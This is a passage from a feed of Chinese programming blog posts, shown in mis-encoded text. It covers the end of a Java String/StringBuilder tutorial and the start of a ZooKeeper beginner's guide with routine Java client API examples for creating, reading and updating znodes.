<h6 data-id="heading-44">4. <strong>å†…å­˜ä¼˜åŒ–</strong></h6>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// é¢„ä¼°å®¹é‡ï¼Œé¿å…é¢‘ç¹æ‰©å®¹</span>
StringBuilder sb = new <span class="hljs-built_in">StringBuilder</span>(<span class="hljs-number">1024</span>);  <span class="hljs-comment">// é¢„åˆ†é…ç©ºé—´</span>

<span class="hljs-comment">// æ¸…ç©ºé‡ç”¨ï¼ˆæ³¨æ„ï¼šnew StringBuilderæ›´æ¸…æ™°ï¼‰</span>
sb<span class="hljs-selector-class">.setLength</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// æ¸…ç©ºå†…å®¹</span>
</code></pre>
<hr/>
<h5 data-id="heading-45">å…­ã€è¡¥å……çŸ¥è¯†ç‚¹</h5>
<h6 data-id="heading-46">1. <strong>StringBuffer</strong></h6>
<ul>
<li><strong>çº¿ç¨‹å®‰å…¨</strong>çš„StringBuilder</li>
<li>æ–¹æ³•ä½¿ç”¨synchronizedä¿®é¥°</li>
<li>æ€§èƒ½ç•¥ä½äºStringBuilder</li>
</ul>
<h6 data-id="heading-47">2. <strong>ç¼–è¯‘å™¨ä¼˜åŒ–</strong></h6>
<pre><code class="hljs language-vbscript" lang="vbscript">// ç¼–è¯‘å™¨ä¼šå°†ä»¥ä¸‹ä»£ç ä¼˜åŒ–ä¸ºStringBuilder
String s = <span class="hljs-string">"A"</span> + <span class="hljs-string">"B"</span> + <span class="hljs-string">"C"</span>;
// ä¼˜åŒ–åï¼š<span class="hljs-keyword">new</span> StringBuilder().append(<span class="hljs-string">"A"</span>).append(<span class="hljs-string">"B"</span>).append(<span class="hljs-string">"C"</span>).<span class="hljs-keyword">to</span><span class="hljs-built_in">String</span>()
</code></pre>
<h6 data-id="heading-48">3. <strong>Java 8+çš„Stringå¢å¼º</strong></h6>
<pre><code class="hljs language-vbnet" lang="vbnet">// é™æ€<span class="hljs-keyword">join</span>æ–¹æ³•
<span class="hljs-type">String</span> result = <span class="hljs-type">String</span>.<span class="hljs-keyword">join</span>(<span class="hljs-string">", "</span>, <span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);  // <span class="hljs-string">"A, B, C"</span>
<span class="hljs-type">String</span> result = <span class="hljs-type">String</span>.<span class="hljs-keyword">join</span>(<span class="hljs-string">", "</span>, list);          // è¿æ¥é›†åˆ
</code></pre>
<hr/>
<h5 data-id="heading-49">ä¸ƒã€ä¸€å¥è¯æ€»ç»“</h5>
<ul>
<li><strong>String</strong>ï¼šå­—ç¬¦ä¸²å¸¸é‡ï¼Œ<strong>åªè¯»</strong>ï¼Œé€‚ç”¨äºå›ºå®šæ–‡æœ¬</li>
<li><strong>StringBuilder</strong>ï¼šå­—ç¬¦ä¸²<strong>æ„é€ å™¨</strong>ï¼Œé€‚ç”¨äº<strong>å•çº¿ç¨‹å¤§é‡æ‹¼æ¥</strong></li>
<li><strong>StringJoiner</strong>ï¼šå­—ç¬¦ä¸²<strong>è¿æ¥å™¨</strong>ï¼Œé€‚ç”¨äº<strong>æ ¼å¼åŒ–æ‹¼æ¥é›†åˆå…ƒç´ </strong></li>
<li>ä¸‰è€…æœ€ç»ˆéƒ½è¦è°ƒç”¨<code>toString()</code>è¿”å›çœŸæ­£çš„Stringå¯¹è±¡</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ZooKeeperå…¥é—¨å®æˆ˜ï¼šä»é›¶å¼€å§‹æŒæ¡åˆ†å¸ƒå¼åè°ƒæœåŠ¡]]></title>    <link>https://juejin.cn/post/7594514040916426779</link>    <guid>https://juejin.cn/post/7594514040916426779</guid>    <pubDate>2026-01-13T04:33:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594514040916426779" data-draft-id="7594482829753991214" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ZooKeeperå…¥é—¨å®æˆ˜ï¼šä»é›¶å¼€å§‹æŒæ¡åˆ†å¸ƒå¼åè°ƒæœåŠ¡"/> <meta itemprop="keywords" content="ZooKeeper"/> <meta itemprop="datePublished" content="2026-01-13T04:33:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ä¸­é£˜è¡çš„è®°å¿†"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ZooKeeperå…¥é—¨å®æˆ˜ï¼šä»é›¶å¼€å§‹æŒæ¡åˆ†å¸ƒå¼åè°ƒæœåŠ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ä¸­é£˜è¡çš„è®°å¿†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T04:33:16.000Z" title="Tue Jan 13 2026 04:33:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ZooKeeperå…¥é—¨å®æˆ˜ï¼šä»é›¶å¼€å§‹æŒæ¡åˆ†å¸ƒå¼åè°ƒæœåŠ¡</h2>
<blockquote>
<p>åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå¦‚ä½•è®©å¤šä¸ªæœåŠ¡èŠ‚ç‚¹ååŒå·¥ä½œï¼Ÿå¦‚ä½•å®ç°æœåŠ¡æ³¨å†Œä¸å‘ç°ï¼Ÿå¦‚ä½•ä¿è¯é…ç½®çš„ä¸€è‡´æ€§ï¼Ÿç­”æ¡ˆéƒ½åœ¨ZooKeeperè¿™ä¸ªå¼ºå¤§çš„åˆ†å¸ƒå¼åè°ƒæœåŠ¡ä¸­ã€‚</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€ä»€ä¹ˆæ˜¯ZooKeeperï¼Ÿ</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84c877816857462f923e6ad7fab0bca6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768883596&amp;x-signature=7XJHYivS36HE8ZFbaXf4tNPe4EQ%3D" alt="" loading="lazy"/></p>
<p>ZooKeeperæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼åè°ƒæœåŠ¡ï¼Œç”±ApacheåŸºé‡‘ä¼šç»´æŠ¤ã€‚å®ƒæœ€åˆæ˜¯é›…è™å…¬å¸ä¸ºäº†è§£å†³åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„åè°ƒé—®é¢˜è€Œå¼€å‘çš„ï¼Œç°åœ¨å·²ç»æˆä¸ºHadoopã€HBaseã€Kafkaç­‰ä¼—å¤šåˆ†å¸ƒå¼ç³»ç»Ÿçš„åŸºç¡€è®¾æ–½ã€‚</p>
<h4 data-id="heading-2">1.1 ZooKeeperçš„æ ¸å¿ƒç‰¹æ€§</h4>
<ul>
<li><strong>ç®€å•æ€§</strong>ï¼šæä¾›äº†ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶ç³»ç»Ÿçš„å±‚çº§å‘½åç©ºé—´</li>
<li><strong>é«˜å¯ç”¨æ€§</strong>ï¼šé€šè¿‡é›†ç¾¤éƒ¨ç½²ä¿è¯æœåŠ¡çš„é«˜å¯ç”¨æ€§</li>
<li><strong>ä¸€è‡´æ€§</strong>ï¼šä¿è¯æ•°æ®åœ¨æ‰€æœ‰æœåŠ¡å™¨ä¸Šçš„ä¸€è‡´æ€§</li>
<li><strong>å®æ—¶æ€§</strong>ï¼šå®¢æˆ·ç«¯å¯ä»¥å®æ—¶è·å–æ•°æ®çš„å˜åŒ–é€šçŸ¥</li>
</ul>
<h4 data-id="heading-3">1.2 ä¸ºä»€ä¹ˆéœ€è¦ZooKeeperï¼Ÿ</h4>
<p>åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬ç»å¸¸é¢ä¸´ä»¥ä¸‹æŒ‘æˆ˜ï¼š</p>
<ul>
<li><strong>æœåŠ¡æ³¨å†Œä¸å‘ç°</strong>ï¼šå¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒæœåŠ¡å¦‚ä½•ç›¸äº’å‘ç°ï¼Ÿ</li>
<li><strong>é…ç½®ç®¡ç†</strong>ï¼šå¤šä¸ªæœåŠ¡å®ä¾‹å¦‚ä½•ä¿æŒé…ç½®ä¸€è‡´ï¼Ÿ</li>
<li><strong>åˆ†å¸ƒå¼é”</strong>ï¼šå¦‚ä½•é¿å…å¤šä¸ªæœåŠ¡åŒæ—¶æ“ä½œåŒä¸€èµ„æºï¼Ÿ</li>
<li><strong>Leaderé€‰ä¸¾</strong>ï¼šå¦‚ä½•ä»å¤šä¸ªæœåŠ¡èŠ‚ç‚¹ä¸­é€‰å‡ºä¸€ä¸ªä¸»èŠ‚ç‚¹ï¼Ÿ</li>
<li><strong>åˆ†å¸ƒå¼åè°ƒ</strong>ï¼šå¦‚ä½•åè°ƒå¤šä¸ªæœåŠ¡èŠ‚ç‚¹çš„è¡Œä¸ºï¼Ÿ</li>
</ul>
<p>ZooKeeperæ­£æ˜¯ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜è€Œç”Ÿçš„ï¼</p>
<h3 data-id="heading-4">äºŒã€ZooKeeperçš„æ•°æ®æ¨¡å‹</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7496fed90efc424cb2f3912c94010088~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768883596&amp;x-signature=QWZJgU8RRoWbyW4dbFctjBCUU%2Bo%3D" alt="" loading="lazy"/></p>
<p>ZooKeeperçš„æ•°æ®æ¨¡å‹ç±»ä¼¼äºUnixæ–‡ä»¶ç³»ç»Ÿï¼Œé‡‡ç”¨å±‚çº§åŒ–çš„æ ‘çŠ¶ç»“æ„ã€‚æ ‘ä¸­çš„èŠ‚ç‚¹è¢«ç§°ä¸º"Znode"ã€‚</p>
<h4 data-id="heading-5">2.1 Znodeçš„ç±»å‹</h4>
<p>æ ¹æ®èŠ‚ç‚¹çš„ç”Ÿå‘½å‘¨æœŸå’Œç‰¹æ€§ï¼ŒZnodeå¯ä»¥åˆ†ä¸ºå››ç§ç±»å‹ï¼š</p>
<h5 data-id="heading-6">1. æŒä¹…èŠ‚ç‚¹ï¼ˆPERSISTENTï¼‰</h5>
<ul>
<li>èŠ‚ç‚¹åˆ›å»ºåä¼šä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ°æ˜¾å¼åˆ é™¤</li>
<li>é€‚ç”¨äºå­˜å‚¨é…ç½®ä¿¡æ¯ã€æœåŠ¡åˆ—è¡¨ç­‰æ•°æ®</li>
<li>ç¤ºä¾‹ï¼š<code>/config/database</code></li>
</ul>
<h5 data-id="heading-7">2. ä¸´æ—¶èŠ‚ç‚¹ï¼ˆEPHEMERALï¼‰</h5>
<ul>
<li>èŠ‚ç‚¹çš„ç”Ÿå‘½å‘¨æœŸä¸å®¢æˆ·ç«¯ä¼šè¯ç»‘å®š</li>
<li>å®¢æˆ·ç«¯ä¼šè¯ç»“æŸåï¼ŒèŠ‚ç‚¹è‡ªåŠ¨åˆ é™¤</li>
<li>é€‚ç”¨äºæœåŠ¡æ³¨å†Œã€å¿ƒè·³æ£€æµ‹ç­‰åœºæ™¯</li>
<li>ç¤ºä¾‹ï¼š<code>/services/provider-001</code></li>
</ul>
<h5 data-id="heading-8">3. æŒä¹…é¡ºåºèŠ‚ç‚¹ï¼ˆPERSISTENT_SEQUENTIALï¼‰</h5>
<ul>
<li>åŸºæœ¬ç‰¹æ€§ä¸æŒä¹…èŠ‚ç‚¹ç›¸åŒ</li>
<li>åˆ›å»ºæ—¶è‡ªåŠ¨åœ¨èŠ‚ç‚¹ååè¿½åŠ 10ä½æ•°å­—åºå·</li>
<li>é€‚ç”¨äºåˆ†å¸ƒå¼é˜Ÿåˆ—ã€å…¨å±€IDç”Ÿæˆç­‰åœºæ™¯</li>
<li>ç¤ºä¾‹ï¼š<code>/tasks/seq-0000000001</code></li>
</ul>
<h5 data-id="heading-9">4. ä¸´æ—¶é¡ºåºèŠ‚ç‚¹ï¼ˆEPHEMERAL_SEQUENTIALï¼‰</h5>
<ul>
<li>åŸºæœ¬ç‰¹æ€§ä¸ä¸´æ—¶èŠ‚ç‚¹ç›¸åŒ</li>
<li>åˆ›å»ºæ—¶è‡ªåŠ¨è¿½åŠ åºå·</li>
<li>é€‚ç”¨äºåˆ†å¸ƒå¼é”ã€Leaderé€‰ä¸¾ç­‰åœºæ™¯</li>
<li>ç¤ºä¾‹ï¼š<code>/locks/resource-0000000001</code></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e434b546f381424597e263a17ffdcf11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768883596&amp;x-signature=4RluAzj7RjX9he50kMIi67E5rlY%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-10">2.2 Znodeçš„ç»“æ„</h4>
<p>æ¯ä¸ªZnodeåŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZnodeData</span> {
    String path;           <span class="hljs-comment">// èŠ‚ç‚¹è·¯å¾„</span>
    <span class="hljs-type">byte</span>[] data;           <span class="hljs-comment">// èŠ‚ç‚¹æ•°æ®ï¼ˆæœ€å¤§1MBï¼‰</span>
    <span class="hljs-type">int</span> version;           <span class="hljs-comment">// æ•°æ®ç‰ˆæœ¬å·</span>
    <span class="hljs-type">int</span> cversion;          <span class="hljs-comment">// å­èŠ‚ç‚¹ç‰ˆæœ¬å·</span>
    <span class="hljs-type">int</span> aversion;          <span class="hljs-comment">// ACLç‰ˆæœ¬å·</span>
    <span class="hljs-type">long</span> ephemeralOwner;   <span class="hljs-comment">// ä¸´æ—¶èŠ‚ç‚¹æ‰€å±ä¼šè¯ID</span>
    <span class="hljs-type">long</span> dataLength;       <span class="hljs-comment">// æ•°æ®é•¿åº¦</span>
    <span class="hljs-type">int</span> numChildren;       <span class="hljs-comment">// å­èŠ‚ç‚¹æ•°é‡</span>
    <span class="hljs-type">long</span> pzxid;            <span class="hljs-comment">// æœ€åä¿®æ”¹å­èŠ‚ç‚¹çš„äº‹åŠ¡ID</span>
}
</code></pre>
<h3 data-id="heading-11">ä¸‰ã€ZooKeeperçš„åŸºæœ¬æ“ä½œ</h3>
<p>ZooKeeperæä¾›äº†ä¸°å¯Œçš„APIæ¥è¿›è¡ŒèŠ‚ç‚¹æ“ä½œï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ç±»ï¼š</p>
<h4 data-id="heading-12">3.1 åˆ›å»ºè¿æ¥</h4>
<p>é¦–å…ˆéœ€è¦åˆ›å»ºZooKeeperå®¢æˆ·ç«¯è¿æ¥ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZooKeeperConnection</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SESSION_TIMEOUT</span> <span class="hljs-operator">=</span> <span class="hljs-number">30000</span>; <span class="hljs-comment">// 30ç§’ä¼šè¯è¶…æ—¶</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONNECTION_STRING</span> <span class="hljs-operator">=</span> <span class="hljs-string">"localhost:2181"</span>;

    <span class="hljs-keyword">private</span> ZooKeeper zooKeeper;
    <span class="hljs-keyword">private</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">connectedLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);

    <span class="hljs-keyword">public</span> ZooKeeper <span class="hljs-title function_">connectSync</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException {
        zooKeeper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(CONNECTION_STRING, SESSION_TIMEOUT, event -&gt; {
            <span class="hljs-keyword">if</span> (event.getState() == Event.KeeperState.SyncConnected) {
                connectedLatch.countDown();
            }
        });

        connectedLatch.await(<span class="hljs-number">10</span>, TimeUnit.SECONDS);
        <span class="hljs-keyword">return</span> zooKeeper;
    }
}
</code></pre>
<p><strong>å…³é”®å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>connectionString</code>ï¼šæœåŠ¡å™¨åœ°å€ï¼Œæ ¼å¼ä¸º<code>host:port</code>ï¼Œå¤šä¸ªæœåŠ¡å™¨ç”¨é€—å·åˆ†éš”</li>
<li><code>sessionTimeout</code>ï¼šä¼šè¯è¶…æ—¶æ—¶é—´ï¼Œå•ä½æ¯«ç§’</li>
<li><code>watcher</code>ï¼šç›‘å¬å™¨ï¼Œç”¨äºæ¥æ”¶ZooKeeperçš„äº‹ä»¶é€šçŸ¥</li>
</ul>
<h4 data-id="heading-13">3.2 åˆ›å»ºèŠ‚ç‚¹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºæŒä¹…èŠ‚ç‚¹</span>
<span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> zooKeeper.create(
    <span class="hljs-string">"/config/database"</span>,                    <span class="hljs-comment">// èŠ‚ç‚¹è·¯å¾„</span>
    <span class="hljs-string">"mysql://localhost:3306/db"</span>.getBytes(), <span class="hljs-comment">// æ•°æ®</span>
    ZooDefs.Ids.OPEN_ACL_UNSAFE,          <span class="hljs-comment">// æƒé™ï¼ˆå¼€æ”¾ï¼‰</span>
    CreateMode.PERSISTENT                 <span class="hljs-comment">// èŠ‚ç‚¹ç±»å‹</span>
);

<span class="hljs-comment">// åˆ›å»ºä¸´æ—¶èŠ‚ç‚¹</span>
<span class="hljs-type">String</span> <span class="hljs-variable">tempPath</span> <span class="hljs-operator">=</span> zooKeeper.create(
    <span class="hljs-string">"/services/provider-001"</span>,
    <span class="hljs-string">"192.168.1.100:8080"</span>.getBytes(),
    ZooDefs.Ids.OPEN_ACL_UNSAFE,
    CreateMode.EPHEMERAL
);

<span class="hljs-comment">// åˆ›å»ºé¡ºåºèŠ‚ç‚¹</span>
<span class="hljs-type">String</span> <span class="hljs-variable">seqPath</span> <span class="hljs-operator">=</span> zooKeeper.create(
    <span class="hljs-string">"/tasks/task-"</span>,
    <span class="hljs-string">"task data"</span>.getBytes(),
    ZooDefs.Ids.OPEN_ACL_UNSAFE,
    CreateMode.PERSISTENT_SEQUENTIAL
);
<span class="hljs-comment">// è¿”å›è·¯å¾„å¦‚ï¼š/tasks/task-0000000001</span>
</code></pre>
<p><strong>ç”Ÿäº§ç¯å¢ƒæœ€ä½³å®è·µï¼š</strong></p>
<ol>
<li>åˆ›å»ºèŠ‚ç‚¹å‰å…ˆæ£€æŸ¥çˆ¶è·¯å¾„æ˜¯å¦å­˜åœ¨</li>
<li>å¼‚å¸¸å¤„ç†è¦å®Œå–„ï¼Œç‰¹åˆ«æ˜¯NodeExistsException</li>
<li>é¡ºåºèŠ‚ç‚¹çš„åºå·æ˜¯å•è°ƒé€’å¢çš„ï¼Œå¯ç”¨äºç”Ÿæˆå…¨å±€å”¯ä¸€ID</li>
</ol>
<h4 data-id="heading-14">3.3 è¯»å–èŠ‚ç‚¹æ•°æ®</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¯»å–æ•°æ®</span>
<span class="hljs-type">byte</span>[] data = zooKeeper.getData(<span class="hljs-string">"/config/database"</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data);

<span class="hljs-comment">// è¯»å–æ•°æ®å¹¶ç›‘å¬å˜åŒ–</span>
<span class="hljs-type">Stat</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stat</span>();
<span class="hljs-type">byte</span>[] data = zooKeeper.getData(<span class="hljs-string">"/config/database"</span>, watcher, stat);
System.out.println(<span class="hljs-string">"ç‰ˆæœ¬å·ï¼š"</span> + stat.getVersion());
System.out.println(<span class="hljs-string">"æ•°æ®å¤§å°ï¼š"</span> + stat.getDataLength());
</code></pre>
<p><strong>æ•°æ®ç‰ˆæœ¬æ§åˆ¶ï¼š</strong></p>
<ul>
<li>æ¯æ¬¡æ•°æ®æ›´æ–°éƒ½ä¼šå¢åŠ ç‰ˆæœ¬å·</li>
<li>å¯ä»¥ä½¿ç”¨CASï¼ˆCompare-And-Swapï¼‰æœºåˆ¶è¿›è¡Œä¹è§‚é”æ›´æ–°</li>
<li>Statå¯¹è±¡åŒ…å«èŠ‚ç‚¹çš„è¯¦ç»†å…ƒä¿¡æ¯</li>
</ul>
<h4 data-id="heading-15">3.4 æ›´æ–°èŠ‚ç‚¹æ•°æ®</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–å½“å‰çŠ¶æ€</span>
<span class="hljs-type">Stat</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> zooKeeper.exists(<span class="hljs-string">"/config/database"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// ä½¿ç”¨ç‰ˆæœ¬å·æ›´æ–°ï¼ˆä¹è§‚é”ï¼‰</span>
<span class="hljs-type">Stat</span> <span class="hljs-variable">newStat</span> <span class="hljs-operator">=</span> zooKeeper.setData(
    <span class="hljs-string">"/config/database"</span>,
    <span class="hljs-string">"mysql://prod-db:3306/appdb"</span>.getBytes(),
    stat.getVersion()  <span class="hljs-comment">// æŒ‡å®šç‰ˆæœ¬å·</span>
);
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ol>
<li>ç‰ˆæœ¬å·ä¸åŒ¹é…ä¼šæŠ›å‡ºBadVersionException</li>
<li>å¦‚æœç‰ˆæœ¬å·ä¸º-1ï¼Œåˆ™ä¸æ£€æŸ¥ç‰ˆæœ¬ï¼ˆå¼ºåˆ¶æ›´æ–°ï¼‰</li>
<li>æ•°æ®å¤§å°ä¸èƒ½è¶…è¿‡1MB</li>
</ol>
<h4 data-id="heading-16">3.5 åˆ é™¤èŠ‚ç‚¹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ é™¤èŠ‚ç‚¹ï¼ˆéœ€è¦æŒ‡å®šç‰ˆæœ¬å·ï¼‰</span>
<span class="hljs-type">Stat</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> zooKeeper.exists(<span class="hljs-string">"/config/old"</span>, <span class="hljs-literal">false</span>);
